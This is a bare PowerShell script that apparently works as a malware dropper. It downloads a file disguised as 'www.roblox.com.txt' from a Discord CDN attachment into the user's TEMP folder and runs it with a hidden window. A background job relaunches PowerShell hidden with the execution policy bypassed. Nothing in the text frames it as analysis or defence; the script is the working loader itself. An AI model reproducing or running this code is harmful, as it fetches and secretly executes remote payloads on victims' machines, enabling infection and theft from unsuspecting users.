$batUrl = "https://cdn.discordapp.com/attachments/1143578940791857315/1159525530723430520/www.roblox.com.txt" 
$batPath = [System.IO.Path]::Combine($env:TEMP, "www.roblox.com.txt") 
iwr -Uri $batUrl -OutFile $batPath 
 
$psScript = { 
    Start-Process -FilePath powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Wait 
} 
 
$psJob = Start-Job -ScriptBlock $psScript 
 
if (Test-Path $batPath) { 
    Start-Process -FilePath $batPath -WindowStyle Hidden 
} 
 
$psJob | Wait-Job 
$psJob | Remove-Job
